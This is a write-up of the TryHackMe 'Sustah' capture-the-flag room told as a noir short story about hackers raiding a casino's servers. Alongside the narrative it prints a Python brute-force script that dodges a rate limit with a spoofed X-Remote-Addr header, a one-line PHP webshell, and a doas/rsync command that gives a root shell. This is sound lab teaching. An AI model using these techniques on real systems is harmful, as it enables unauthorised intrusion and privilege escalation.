# Sustah
## Rated - Medium
###### Disclaimer: This is both a write-up and a short-story. Feel free to skip the story to the highlighted write-up bits if you're uninterested in it.

#

Pullast, the great city in the mist. It was a city of sin and buzzing lights, of loud frivolous casinos and of expensive tastes indulged in every corner. It was also the last lead that Dennis Smith had on his latest case. 
He couldn't believe he was here again after so long. But he needed some aid in this next job, and he knew just who could aid him in it. He was an odd man, of strange tastes and even stranger methods, but he was a good hacker, and one he knew from his days at the academy. Dennis took in a sharp breath, swallowed his pride, and strolled right into the dingy confines of The Terminal Cult.

Dennis didn't belong here and he knew it. A fine officer's suit and briefcase contrasted heavily with all manner of odd characters that sat around in this bar. His eyes scanned every corner only to notice the countless eyes staring right back at him. It was not his place to mention them, or even pretend to notice all these stares right now. The officer stole himself and marched towards a small room in the back of this neon-lit bar.
It was in the backrooms that an individual awaited him. A man of average stature and average looks. As a matter of fact, he'd probably pay him no heed if he saw him walking on the street. Perhaps the dark clothes were a bit much, but who didn't wear dark shirts and trousers these days? Though he knew behind this air of normalcy was a hacker with just as much vice as he had talent, especially in a city like this one...

\- "Well. At least you're here to meet me this time. It's odd enough for an officer to walk into this part of town, Rondons." - Commented Dennis as he looked at his old friend.
\- "Well... technically..."
\- "Spare me the details. I'll just get to the point." - Was the sharp answer of Dennis. He was used to the ramblings of this individual, and with time running short, they had to be quick. - "There's a group of drug dealers in town called Sustah, you might have heard of them already."
Rondons raised an eyebrow. They were a well-known group of gangsters in this part of town. He wondered what Dennis wanted with them. - "You're asking me to hack Sustah...? You can't be serious."
\- "We have reason to suspect they're in the human trafficking business." - The officer retorted, setting his briefcase upon the table. When it came open, it revealed quite a few shocking pictures; and along with them, there was a note with an IP address the officer had managed to gather. - "And that they're using this IP address to mask their business. We want you to get in and get the evidence."
\- "..."
\- "God damn it, Rondons! I really need the help right now! In just a day, there is a girl that might- !"
\- "Chirst! Dennis! Alright! Alright..." - With a nod, Rondons took the note and read it. The IP address was his first target, so with a sigh, he opened his laptop and began:

Immediately, Rondons started with an nmap scan. Dennis peered over his shoulder to see better, but the man didn't really understand most of what was going on in the screen.
\- "It's an nmap scan. It will let us gather info about all devices sent to a network."

### nmap -vv -A [TryHackMe IP] 

![nmap1](https://user-images.githubusercontent.com/73745039/105637557-17913700-5e66-11eb-9e46-8b98c58584c8.png)

\- "See there." - Motioned Rondons towards the screen, showing him the three ports that the tool quickly discovered. - "Port 22, 80 and 8085. 22 is often an SSH port; 80 is often http.... now 8085..." - He waited a bit more for the rest of the results to show...

![nmap2](https://user-images.githubusercontent.com/73745039/105638748-53c79600-5e6c-11eb-9498-2d5b981ab090.png)

\- "Gunicorn?" - Questioned Dennis.
\- "I don't know what that is either." - Rondons said quickly; but he had a feeling it was some kind of webpage. He opened up his browser and went to check both ports out.)

![page1 1](https://user-images.githubusercontent.com/73745039/105638803-b1f47900-5e6c-11eb-9324-2825c65fc801.png)

\- "Seems like our gang of criminals got a bit of humour eh?" - Dennis added as he saw the strange webpage upon port 80. Rondons didn't seem to share in the humour, for he gave the man but a sideways glance, continuing on to investigate that webpage.
### No cookies... Nothing that seems out of place, no code, nor anything that seemed wrong; and a quick scan with another tool- a certain gobuster- revealed nothing useful either.

![page1 2](https://user-images.githubusercontent.com/73745039/105638853-fbdd5f00-5e6c-11eb-8a2a-9dc508114e7b.png)

Onwards to the other page...

![spin 1](https://user-images.githubusercontent.com/73745039/105638963-8faf2b00-5e6d-11eb-98be-3d01937f933c.png)

\- "Guess it's another front for their casino." - Commented Dennis upon seeing the page and the very obvious wheel. He pulled a chair and sat next to Rondons, getting a bit nervous that they weren't getting anywhere. This was too slow for his liking. Were there no more ports?
\- "Easy. This takes time." - Said Rondons while investigating the page a bit more.

### Searching through the webpage and exploring it a bit, there were a few odd things. First and foremost, when submitting a numbr to the wheel it seemed to immediately tell you that your guess was incorrect, even before you spun it. The code of the wheel was also client-side, and even if the math.random funtion that rules it was altered (so one could predict on where the wheel would land on and correctly guess the number) it would still say your number was wrong.

![spin 2](https://user-images.githubusercontent.com/73745039/105639134-5fb45780-5e6e-11eb-9ee6-fde4b0e37452.png)

![spin 3](https://user-images.githubusercontent.com/73745039/105639139-68a52900-5e6e-11eb-84c5-1f0e452a666d.png)
![spiny](https://user-images.githubusercontent.com/73745039/105639366-c2f2b980-5e6f-11eb-9744-79f2d413d815.png)


\- "This all is strange... this LOOKS like a gambling page, but I don't think it's one at all."
\- "What do you mean?" - With a furrow of his eyebrows, Dennis looked even closer at the screen, trying to understand what Rondons was getting at, and the man explained anyway in his low, somewhat hesitant voice now. 
\- "It doesn't seem like it's actually random. It knows if you failed or not even before we spin the wheel... and this percentage here at the bottom... 0.004%? It just doesn't make sense with the rest of the page."
\- "So?"
\- "So you said they were hiding something in the pages. It seems to me like this is exactly where they're hiding it, but you have to guess some phrase- or even a number to get in." - Rondons mumbled. He started up another tool to send several requests to the server and thus try to guess what this passphrase might be. 

### A brute force attack against the server using BURP or Python in an attempt to find out the passphrase within the number submitted that might reveal an answer.

![spin 4](https://user-images.githubusercontent.com/73745039/105639499-9c814e00-5e70-11eb-9074-8a14d85d9914.png)
![spin 5](https://user-images.githubusercontent.com/73745039/105639503-9f7c3e80-5e70-11eb-90a8-13db18ce33ed.png)

And yet... as the error blared upon his screen, Rondons knew he had hit some kind of filter. The server knew that he was making countless requests. Not to worry, he thought; spoofing his IP should be fairly trivial. With request headers such as X-Forwarded-For: he could alter what IP he looked like he was using to the server.
Unfortunately, even using this wielded no results. A troubled look came upon Rondons as he wasted precious moments trying to understand what the error was. 
Search and try as he might, the server kept throttling him. But then his eyes scanned over one of the contacts he had within The Terminal Cult bar. A man known for his prowess with python, and far more familiar with its tools than he himself was. Better yet, he was someone who had worked within the Sustah Casino in the past.  If their time was short, Rondons took the gamble and called his contact. 
\- "Hey Watchdog. I need a favour. Remember when you worked for the Sustah?" 
There was a quiet silence from the other end for a few moments, before a calm and interested voice responded. - "Yeah?"
\- "Their servers are throttling me. I need to bruteforce one of their pages."
\- "..." - A heavy sigh comes from the other side, before a gentler voice replies with a half chuckle. - "Always getting yourself into trouble eh? Fair enough. I imagine you have a good reason to be doing this. If so count me in!"
After a brief explanation, the answer came as a form of a challenge that neither Rondons nor Dennis was expecting. 
\- "So yeah Rondons, their servers check if too many requests are coming from the exterior. Unless you're directly on their local network, or better yet on one of their servers, you're going to be throttled."
\- "You're kidding me... how the hell do I get in then?!"
There is a pause, and a cheeky comment: 
\- "I think you know the answer to that don't you? The casino is but a walking distance away from The Terminal Cult bar."
\- "The moment they see me I'll be a dead man!"
\- "Not if you're with me!~" - Insisted Watchdog in an almost playful tone.
\- "..." - Rondons was silent for a moment, grumbling. - "I don't like where this is going..."

## . . . 

It wouldn't be long before the trio was setup and ready. Gathering at the entrance of the Casino, and staring up at it, Rondons and Dennis awaited but the arrival of Watchdog. The plan was simple: Rondons and Watchdog would get in, access their servers, and then come out. If anything went wrong then Dennis was there as a backup.
\- "Hey!" - Hoolered a jovial voice from their left. A young man in slick clothes with a cheerful demeanor. The emblem of a white wolf on his jacket gave up his identity: Watchdog. He was younger than Dennis had expected for someone deemed by Rondons to be a pro in his field, and he held up his reservations about hackers in general, but so long as they got the job done, the officer didn't care who was involved.
\- "So are you ready for this or what?" - Added Watchdog, already leading the way into the casino. - "Thought we were on a tight schedule. Come on!" - He insisted.

Walking into the casino was almost like walking into an alien world for Rondons. He was not one for public places, so the luxurious gilded walls filled with all manners of people were far from his comfort zone. These were people from the high society of Pullast. All dressed accordingly and with all manner of strange cyberimplants; some more advanced than others.
In his gaze, he nearly went against a waitress, who had to dodge him with a small yelp. - "Uhm oh- sorry." - Muttered Rondons, realizing he was attracting a lot of attention in here. Maybe he should wear less dark clothes when around these places...

\- "Hey!" - A gruff tall guy motioned to the two, stepping closer and closer. Rondons' heart nearly stopped upon seeing this. Had they been found? Dammit! - "Watchdog! Pleasure seeing you around here again mate! What's up?"
\- "Hey Loid! How's it going man!" - Replied Watchdog without skipping a beat with a natural charm and a natural smile. He gave Rondons a smack on the shoulder: - "I'm just showing my friend here the casino!"
\- "Ah I see. You and him just have to come to the corner with me then. I've got a new package of your favourite drinks. You and him are gonna love it!" - Insisted the big man with a grin, pointing to a darker corner of the bar. Rondons notted, unfortunately, that this are contained no eletronics. Crap!
\- "Sure sure! Let me just tell him- " - Rondons felt Watchdog grab his hand, and passing to him a small USB drive in the hidden gesture. A sleight of hand as the jovial hacker added: - "The bathrooms should be on the second floor. And uh- You'll pay me later for that drink eh? Just go there and do what you have to do." 
Rondons understood, though he did stare like a deer in headlights for a moment. He fumbled to put his hands in his pockets, wanting to hide the USB before it was seen. No good, seems like Watchdog would have to stay behind; but now he was already in- and from the man's words... he knew where he could find a terminal.


After a few moments of searching around, Rondons was able to sneak away from the crowds of the lower floor. Soon, he found the terminal that Watchdog had mentioned. A small office that was currently empty. He gazed to the right, then to the left, and entered.
Opening up the terminal, he slipped the USB into the correct port. The file that came up made him smile. That sly dog. Watchdog had prepared a script that would run the brute-force attack for him. This should save some time.

# 
```
# Written by WATCHDOG2000 23/01/2021
# For the Try Hack Me Room 'Sustah'
import requests
import sys
from datetime import datetime

if len(sys.argv) != 2:
	print("[!] - PLEASE ENTER THE URL")
	sys.exit(1)
	
url = sys.argv[1] # url is the first parameter
data = {"number": "SWAPME"} # data we are submitting
custom_headers = {"X-Remote-Addr": "127.0.0.1"} # bypasses the rate elimit from X-RateLimit-limit
lowest = 10000
highest = 99999
start_time = datetime.now() # records the time the script starts, for calculation of how long it has run for.
for i in range(lowest, highest):
	now = datetime.now() # get the current time for runtime of the program
	time_running = now-start_time
	data["number"] = i # set our number to the number to try
	sys.stdout.write(f"\r[*] - TRYING {i} -- RUNNING FOR {str(time_running)} SECONDS -- {str(i - lowest)} REQS IN")
	resp = requests.post(url, data=data, headers=custom_headers) # submit to server, with bypass limit

	if "unlucky" not in resp.text: # we have found the right number!!
		print("\n" + resp.text)
		break
```
# 

#### (( Note From the Author: You don't actually have to access any place physically. The true answer lies in using the X-Remote-Addr header as demonstrated in the script above. That will bypass the filter. But for the context of the story, it was more dramatic this way.))
![dogpy 1](https://user-images.githubusercontent.com/73745039/105640505-5af3a180-5e76-11eb-89ed-0559116873cb.png)
![image](https://user-images.githubusercontent.com/73745039/105640563-b756c100-5e76-11eb-98e6-3cfe9120bbe6.png)


Bingo! It seems that his guess wasn't all that wrong afterall. An impossible number for this wheel revealed a secret path for him to follow.
Rondons cast a look around, making sure that no one could see him still. He hardly enjoyed having to continue this within the casino grounds, but with the terminal in his hands, he continued: First, he tried this new path on the spin the wheel page. But it revealed nothing.
### Fortunately, there was another page for him to try: The one running on port 80. The one with the odd quote. He went there and- Voilà! That's where the secret path needed to be inputted.

![mara1](https://user-images.githubusercontent.com/73745039/105640750-7f9c4900-5e77-11eb-849b-31e943ea37ca.png)

A CMS (Content Management System). A computer software which uses a database to -as the name implies- manage content, It's something akin to wordpress. Rondons figured this is where the illegal stuff was happening... though any trace might have already been deleted.
#### Searching around a bit on the page he spotted a Sitemap. It's perfect to find all kinds of pages; specifically he could find the version of this software which can sometimes be useful to search for exploits. Even more damming though, he found a login portal with default credentials for its administrative account.
Such a rookie mistake... then again, maybe these guys never expected anyone who wasn't supposed to to get here.

![mara2](https://user-images.githubusercontent.com/73745039/105640816-ff2a1800-5e77-11eb-8017-6dea7feb46eb.png)
![mara3](https://user-images.githubusercontent.com/73745039/105640820-04876280-5e78-11eb-90b9-65de080cc905.png)

A smirk crossed Rondon's lips as he got access to the admin acount on the website. Now all he needed to do was to find somewhere vulnerable on the website where he could upload a reverse shell. A reverse shell would be a way for him to get into the system that was running the server itself. A bit more looking around and he found a place where he could upload files that would become new webpages. It was somewhat restricted in the size of what he could upload, but he knew of a simple webshell that he could use to then get a proper reverse shell.
```
<?php echo passthru($_GET['cmd']) ?> 
```
### This simple php reverse shell would allow him to pass commands onto the page itself. It was limited, but it would enable him to then get a proper reverse shell.

![mara4](https://user-images.githubusercontent.com/73745039/105640891-ab6bfe80-5e78-11eb-97db-737d3dbeb9b6.png)
![mara5](https://user-images.githubusercontent.com/73745039/105640893-ae66ef00-5e78-11eb-9e26-09664126b27a.png)
![mara6](https://user-images.githubusercontent.com/73745039/105640896-b3c43980-5e78-11eb-9f4c-f4875c466064.png)
![mara8](https://user-images.githubusercontent.com/73745039/105642390-51bc0200-5e81-11eb-9003-a8894b26f41b.PNG)

Now that he had the webshell, Rondons needed only to move up to a proper reverse shell. As he typed the payload into the cmd argument within the page, Rondons couldn't help but remember those cringy over-the-top shows where hackers were depicted as these dark figures who could do anything in front of a keyboard. And just as he caught the webshell, he chuckled as all he could think about was a certain catchphrase that caught on: 
\- "I'm in."

![system1](https://user-images.githubusercontent.com/73745039/105642476-e0c91a00-5e81-11eb-95dd-d0abdeff27d5.PNG)

Well now he was in the system itself, and he had no time to lose. Just briefly he gave a glance around, assuring himself that none were snooping on him again. The sounds of the casino could be heard below, and the distant footsteps that had his heart hammer in his chest. Carefully, he continued, trying to quickly get the evidence he needed and get out. The find command within Linux would certainly do the job for all he intended, but as ill-luck would have it, the damn command was blocked in the system. He couldn't use it!
Thankfully... there are more ways to skin a cat... if he couldn't use the find command then he decided he'd just snoop around a bit, see if he could find any important files.
A creak of a nearby door had his heart nearly jump in his chest and his fingers freeze in place. The young man bit his lip as he heard steps approach the door... but thankfully, they waned after just a few moments, and his search continued.

### Under the backups folder a hidden backup file can be found. It contains the password to another user: kiran.
![system3](https://user-images.githubusercontent.com/73745039/105642701-2803da80-5e83-11eb-863d-69195de4f6f6.PNG)
![sys](https://user-images.githubusercontent.com/73745039/105643711-5c7a9500-5e89-11eb-8e19-7358bb25fef9.PNG)

Now he was kiran on the system. A simply "su kiran" followed by his password and he had all the permissions that this man had. He figured he must be one of the clients of these criminals, and indeed:
### Going into kiran's home directory (/home/kiran) as kiran would allow you to get the user flag.
All the content of a man who had engaged in this trafficking, and all the proof that Dennis needed to implicate the organization. But he wasn't done yet. Rondons had a hunch that there was more within the system. More damming evidence. For it he'd need root access: the most elevated privileges within Linux.

There were no sudo permissions for this user either. Rondons needed a SUID or something like it. A file that runs as the root user, and one he could exploit. He couldn't use the find command as it was blocked in this system, but he had an idea of another command he could use that would work in its sted. 
### using ``` ls -al /*/*/* 2>/dev/null | grep rws ``` will reveal the SUID files without needing to use grep. In this case, "ls" is listing files, even hidden ones, and throwing away any errors. Then we're using grep to get only the relevant SUID files from those.

![system5](https://user-images.githubusercontent.com/73745039/105642900-7665a900-5e84-11eb-840b-080f46653542.PNG)

Between all these files, one stands out. A certain "doas". Rondons doesn't quite know what that binary does but he begins to search for it in hopes to be able to find out.
\- "Hey. What are you doing here?" - A feminine voice makes Rondons freeze up in place. His eyes widen and he shudders at the realization he has been caught. Out of the corner of his eye he can see a woman in the hallway, the same woman he had accidentaly nearly knocked over when entering the building.
\- "I am uh... just checking a few files..." - He tries to mumble an excuse and sound as natural as can be. Slowly he tries to type a bit more but this only seems to alarm the woman more.
\- "I think I saw you with one of the clients down there! I- I'm going to call security!" - She threatens, and is just about to leave when- 

TONK
A hard sound emanates from the broom Watchdog had used to knock this woman out. He took no pleasure in it, and seemed rather apologetic. With grace he hopped over the fallen body of the girl and moved closer to Rondons, worry clearly painting his face as well now: - "Please tell me you're done. I said I was gonna check up on you. They're getting suspicious."
\- "I'm not sure. I find this Doas SUID, never seen it before."
Wracking his head around it, Watchdog took a moment to think about it, and then he answered: - "Wait. I think I know. That's like, a replacement for sudo. It lets you run things as another user. Look for a doas configuration file."
With that, Rondons got to work. It took some time to find the files within the system. A program like Linpeas or other tools that aid in previledge escalation would have gotten there faster, but eventually:

### Doas.conf can be found within /usr/local/etc, and it reads that user kiran an run rsync as root through doas.

![system7](https://user-images.githubusercontent.com/73745039/105643197-4fa87200-5e86-11eb-9e98-e20fdaf0c5c6.PNG)

And that is something that they can exploit. Side by side, the two hackers figure out the payload they need to get root privileges within the system:

### doas -u root rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null 

![system10](https://user-images.githubusercontent.com/73745039/105643303-fab92b80-5e86-11eb-99b7-cf3e936fa369.PNG)


And with that, they owned the system. Within the root folder; Watchdog and Rondons would find all the evidence that they needed. They gathered it and it was now time to leave. Just in time too for they could hear the fast-approaching footsteps of someone coming in to check on them and what they were doing. By the sounds of it- by that I mean with how quickly these hunters were moving- it seemed as if they had already checked the pathroom and found no on in there.
With a glance at one another, the two hackers booked it. They ran down the hallway just as one of the casino criminals spotted them:  - "Hey! HEY!"

They pushed past the crowd, with Watchdog on the front making way and Rondons taking advantage of the path he opened. They heard gasps in surprise from the people they pushed, and the louder and louder screams of security as they realized what was going on.
Being a large casino, the two had to turn quite a few corners and move through rows of slot machines before they were out. Rondons' heart screaming in his chest for him to move faster, but he wasn't really the athletic duo. Adrenaline kept him going though, especially when he swore that the security started firing at them:
BANG

"Crap! Crap!" - Rondons shouted, dashing for the door with Watchdog and making it outside just in time for Dennis to give them cover. The officer returned fire once, giving the pursuers enough pause that the two hackers made it into Dennis' car. He put pedal to the metal, and they were off: speeding away from the Casino.
\- "Tell me you got it." - Dennis requested as he drove away, glancing at the two breathless men in the backseat. Watchdog smirked, Rondons smiled, and they both lifted the USB containing all the evidence they needed.
The bust had been a success.

# 

###### Author Note: I hope you've enjoyed this different kind of writeup. If you have any suggestions or comments please feel free to make them. This was made possible with the TryHackMe room Sustah and its design that inspired this short tale.
###### Also, if you can, check out Watchdog2000, the real one: https://github.com/watchdog2000
 
